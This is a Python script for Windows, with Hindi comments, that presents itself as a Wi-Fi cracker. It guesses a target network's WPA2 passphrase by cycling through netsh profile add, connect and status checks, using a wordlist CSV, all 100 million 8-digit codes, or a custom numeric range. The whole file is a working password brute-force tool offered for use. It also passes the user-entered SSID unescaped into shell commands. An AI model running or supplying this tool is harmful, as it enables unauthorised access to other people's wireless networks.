import subprocess
import os
import csv
import time
# --- Helper Functions ---
def create_wifi_xml_profile(ssid, password):
    """
    Wi-Fi प्रोफाइल के लिए XML कंटेंट बनाता है.
    इसमें नेटवर्क का नाम (SSID), सुरक्षा प्रकार (WPA2PSK),
    एन्क्रिप्शन (AES), और पासवर्ड शामिल होता है.
    """
    xml_content = f"""<?xml version="1.0"?>
<WLANProfile xmlns="http://www.microsoft.com/networking/WLAN/profile/v1">
    <name>{ssid}</name>
    <SSIDConfig>
        <SSID>
            <name>{ssid}</name>
        </SSID>
    </SSIDConfig>
    <connectionType>ESS</connectionType>
    <connectionMode>auto</connectionMode>
    <MSM>
        <security>
            <authEncryption>
                <authentication>WPA2PSK</authentication>
                <encryption>AES</encryption>
                <useOneX>false</useOneX>
            </authEncryption>
            <sharedKey>
                <keyType>passPhrase</keyType>
                <protected>false</protected>
                <keyMaterial>{password}</keyMaterial>
            </sharedKey>
        </security>
    </MSM>
    <MacRandomization xmlns="http://www.microsoft.com/networking/WLAN/profile/v3">
        <enableRandomization>false</enableRandomization>
    </MacRandomization>
</WLANProfile>"""
    return xml_content

def save_xml_profile_to_file(ssid, xml_content):
    """
    जनरेट किए गए XML प्रोफाइल कंटेंट को एक अस्थायी .xml फ़ाइल में सेव करता है.
    फ़ाइल का नाम SSID से लिया गया है ताकि कोई टकराव न हो.
    """
    profile_name_for_file = ssid.replace(" ", "_")
    xml_file_path = f"{profile_name_for_file}.xml"
    with open(xml_file_path, 'w') as f:
        f.write(xml_content)
    return xml_file_path

def add_wifi_profile(xml_file_path):
    """
    'netsh wlan add profile' कमांड का उपयोग करके XML फ़ाइल से Wi-Fi प्रोफाइल को Windows सिस्टम में जोड़ता है.
    """
    # 'interface="Wi-Fi"' Windows पर Wi-Fi एडाप्टर का सामान्य नाम है.
    # अगर आपके कंप्यूटर पर यह अलग है (जैसे "Wireless Network Connection"), तो इसे यहां बदलें.
    command = f'netsh wlan add profile filename="{xml_file_path}" interface="Wi-Fi"'
    try:
        subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        return True
    except subprocess.CalledProcessError as e:
        return False

def connect_to_wifi(ssid):
    """
    अपने प्रोफाइल का उपयोग करके निर्दिष्ट Wi-Fi नेटवर्क से कनेक्ट करने का प्रयास करता है.
    """
    command = f'netsh wlan connect name="{ssid}" ssid="{ssid}" interface="Wi-Fi"'
    try:
        # हम यहां check=True का उपयोग नहीं करते क्योंकि 'connect' कमांड हमेशा एक त्रुटि कोड नहीं देता
        # भले ही कनेक्शन बाद में विफल हो जाए. हम is_wifi_connected() के साथ कनेक्शन स्थिति सत्यापित करेंगे.
        subprocess.run(command, shell=True, capture_output=True, text=True)
        return True
    except Exception as e:
        return False

def is_wifi_connected(ssid):
    """
    जांचता है कि Wi-Fi एडाप्टर वर्तमान में निर्दिष्ट SSID से जुड़ा है या नहीं.
    यह 'netsh wlan show interfaces' के आउटपुट को पार्स करता है.
    """
    command = 'netsh wlan show interfaces'
    try:
        result = subprocess.run(command, shell=True, check=True, capture_output=True, text=True)
        output = result.stdout
        if f"SSID                   : {ssid}" in output and "State                  : connected" in output:
            return True
        return False
    except subprocess.CalledProcessError as e:
        return False

def clean_up_xml_file(xml_file_path):
    """अस्थायी XML प्रोफाइल फ़ाइल को हटाता है."""
    if os.path.exists(xml_file_path):
        os.remove(xml_file_path)

def delete_wifi_profile(ssid):
    """टकराव से बचने के लिए सिस्टम से Wi-Fi प्रोफाइल को हटाता है."""
    command = f'netsh wlan delete profile name="{ssid}"'
    try:
        subprocess.run(command, shell=True, capture_output=True, text=True)
    except Exception as e:
        pass # अगर प्रोफाइल मौजूद नहीं है तो त्रुटि को अनदेखा करें

# --- Main Logic ---

def run_wifi_cracker(target_wifi_ssid, password_source_type, password_csv_file=None, start_num=None, end_num=None, pad_length=8):
    """
    Wi-Fi Cracking Steps Runner.
    """
    print(f"\n--- Wi-Fi connection trying Starting ---")
    print(f"Goal Wi-Fi Network Name: '{target_wifi_ssid}'")

    found_password = None
    passwords_tried = 0
    start_time = time.time()

    try:
        if password_source_type == 'csv':
            print(f"password through '{password_csv_file}' is reading .\n")
            if not os.path.exists(password_csv_file):
                print(f"Error: CSV file '{password_csv_file}' Does not exist.")
                print("Please Conform That Password is writed in the CSV FILE (Line By Line).")
                return

            with open(password_csv_file, 'r', newline='') as f:
                reader = csv.reader(f)
                for row in reader:
                    if not row or not row[0].strip():
                        continue
                    current_password = row[0].strip()
                    passwords_tried += 1
                    print(f"--- password #{passwords_tried} is trying (through CSV): '{current_password}' ---")

                    # Wi-Fi कनेक्ट करने का प्रयास करें
                    if attempt_connection(target_wifi_ssid, current_password):
                        found_password = current_password
                        break # कनेक्शन सफल होने पर लूप से बाहर निकलें

        elif password_source_type == 'fixed_range':
            print("password 00000000 to 99999999 is genrating.\n")
            for i in range(100000000): # 0 से 99,999,999 तक (कुल 10 करोड़ पासवर्ड)
                current_password = str(i).zfill(8) # 8-अंकीय स्ट्रिंग में फॉर्मेट करें
                passwords_tried += 1
                if passwords_tried == 1 or passwords_tried % 1000 == 0:
                    print(f"--- password #{passwords_tried} trying (Through Fixed Range): '{current_password}' ---")

                # Wi-Fi कनेक्ट करने का प्रयास करें
                if attempt_connection(target_wifi_ssid, current_password):
                    found_password = current_password
                    break # कनेक्शन सफल होने पर लूप से बाहर निकलें

        elif password_source_type == 'custom_range':
            # pad_length को सुनिश्चित करें कि यह कम से कम end_num_str की लंबाई जितना हो
            # ताकि छोटे पासवर्ड (जैसे 0001) भी सही से पैड हो सकें
            # और pad_length की गणना start_num और end_num के स्ट्रिंग रूप की अधिकतम लंबाई से करें
            # लेकिन यह भी सुनिश्चित करें कि यह 8 से कम न हो यदि यूजर 8-अंकीय पासवर्ड चाहते हैं.
            # या फिर यूजर से pad_length भी पूछ लें. यहाँ हमने इसे start_num/end_num की अधिकतम लंबाई से लिया है.
            actual_pad_length = max(len(str(start_num)), len(str(end_num)), pad_length)

            print(f"password {str(start_num).zfill(actual_pad_length)} to {str(end_num).zfill(actual_pad_length)} is genrating (length: {actual_pad_length}).\n")
            for i in range(start_num, end_num + 1):
                current_password = str(i).zfill(actual_pad_length)
                passwords_tried += 1
                if passwords_tried == 1 or passwords_tried % 1000 == 0:
                    print(f"--- password #{passwords_tried} trying (through Custom Range): '{current_password}' ---")

                # Wi-Fi कनेक्ट करने का प्रयास करें
                if attempt_connection(target_wifi_ssid, current_password):
                    found_password = current_password
                    break # कनेक्शन सफल होने पर लूप से बाहर निकलें

        else:
            print("Error: password Type Error.")
            return

    except Exception as e:
        print(f"\nany error: {e}")

    finally:
        # अंतिम सफाई
        temp_xml_path = f"{target_wifi_ssid.replace(' ', '_')}.xml"
        clean_up_xml_file(temp_xml_path)
        if found_password:
             delete_wifi_profile(target_wifi_ssid)

    end_time = time.time()
    duration = end_time - start_time

    if found_password:
        print(f"\n***** '{target_wifi_ssid}' is Successfully Connected *****")
        print(f"***** Password Found: '{found_password}' *****")
        print(f"\n--- Script Ended: '{target_wifi_ssid}' is connected through password -  '{found_password}' -----")
    else:
        print(f"\n--- Script Ended: Can't Connected to goal Wi-Fi OR all tried Password is Wrong. ---")

    print(f"total password tried: {passwords_tried}")
    print(f"total time: {duration:.2f} Second")

def attempt_connection(ssid, password):
    """
    एक दिए गए पासवर्ड के साथ कनेक्शन का प्रयास करता है.
    यह एक हेल्पर फ़ंक्शन है जिसे सभी विकल्पों द्वारा उपयोग किया जाता है.
    """
    # सुनिश्चित करें कि कोई पुराना प्रोफाइल हस्तक्षेप न करे
    delete_wifi_profile(ssid)
    time.sleep(0.1) # सिस्टम को थोड़ा समय दें

    # 1. XML प्रोफाइल बनाएं
    xml_content = create_wifi_xml_profile(ssid, password)
    xml_file_path = save_xml_profile_to_file(ssid, xml_content)

    # 2. Wi-Fi प्रोफाइल जोड़ें
    if add_wifi_profile(xml_file_path):
        time.sleep(0.5) # प्रोफाइल जोड़ने के बाद थोड़ा इंतज़ार करें

        # 3. कनेक्शन प्रयास शुरू करें
        if connect_to_wifi(ssid):
            time.sleep(4) # कनेक्शन स्थापित होने का इंतज़ार करें

            # 4. जांचें कि कनेक्शन सफल रहा या नहीं
            if is_wifi_connected(ssid):
                return True
    return False

# --- स्क्रिप्ट का प्रवेश बिंदु ---
if __name__ == "__main__":
    wifissid = input("Please Enter Your Wi-fi SSID: ")
    # <<<<<<<--- यहां अपनी जानकारी डालें --->>>>>>>
    # उस Wi-Fi का सही नाम (SSID) डालें जिससे आप कनेक्ट करना चाहते हैं
    target_wifi_ssid = wifissid # उदाहरण: "MyHomeNetwork"
    # CSV फ़ाइल का नाम (अगर आप CSV विकल्प चुनते हैं)
    password_csv_file = "passwords.csv"
    # <<<<<<<--------------------------------------->>>>>>>

    print("Choose Type For Wifi Password Cracking:")
    print("1. Import Password's From CSV file")
    print("2. Fixed Numerical Range (00000000 - 99999999)")
    print("3. Custom Range Password")

    choice = input("Enter Your Choice (1, 2 or 3): ").strip()

    if choice == '1':
        # CSV फ़ाइल के लिए नमूना बनाएं अगर मौजूद नहीं है
        if not os.path.exists(password_csv_file):
            print(f"\nspecimen '{password_csv_file}' File Is Creating.")
            print("Please Enter Your password's Copy on this File.")
            with open(password_csv_file, 'w', newline='') as f:
                writer = csv.writer(f)
                writer.writerow(['password123'])
                writer.writerow(['guest123'])
                writer.writerow(['admin123'])
            print(f"specimen file '{password_csv_file}' is successfully Created Enter Your Passwords In this File and and run the script one more time .")
            exit()
        run_wifi_cracker(target_wifi_ssid, 'csv', password_csv_file=password_csv_file)
    elif choice == '2':
        run_wifi_cracker(target_wifi_ssid, 'fixed_range')
    elif choice == '3':
        while True:
            try:
                start_num_str = input("Enter First Number (Eg. 1000): ").strip()
                end_num_str = input("Enter Last Number (Eg. 9999): ").strip()

                start_num = int(start_num_str)
                end_num = int(end_num_str)

                # पैड की लंबाई निर्धारित करें: इनपुट संख्याओं की अधिकतम लंबाई
                # या न्यूनतम 8, जो भी बड़ा हो (यदि आप 8-अंकीय पासवर्ड चाहते हैं)
                # यदि यूजर 4-अंकीय पासवर्ड के लिए 1000-9999 देता है तो pad_length 4 होगी
                # यदि यूजर 0001-0005 देता है तो pad_length 4 होगी
                pad_length = max(len(start_num_str), len(end_num_str))


                if start_num > end_num:
                    print("Error: The First No. is not greator than Second No. Please Try again.")
                elif len(str(start_num)) > 15 or len(str(end_num)) > 15: # बहुत बड़ी संख्या से बचने के लिए
                    print("Error: The Length Of the No. is too large. please enter a short length No. (Eg. 15 or less than 15).")
                else:
                    run_wifi_cracker(target_wifi_ssid, 'custom_range', start_num=start_num, end_num=end_num, pad_length=pad_length)
                    break # अगर सफलतापूर्वक चला तो लूप से बाहर निकलें
            except ValueError:
                print("Error : wrong type of password. please enter only Numerical type password.")
            except Exception as e:
                print(f"Oh : a Error was found: {e}")
    else:
        print("Wrong Vote. Please Enter Only 1, 2 or 3.")

    print("\nProccess End.")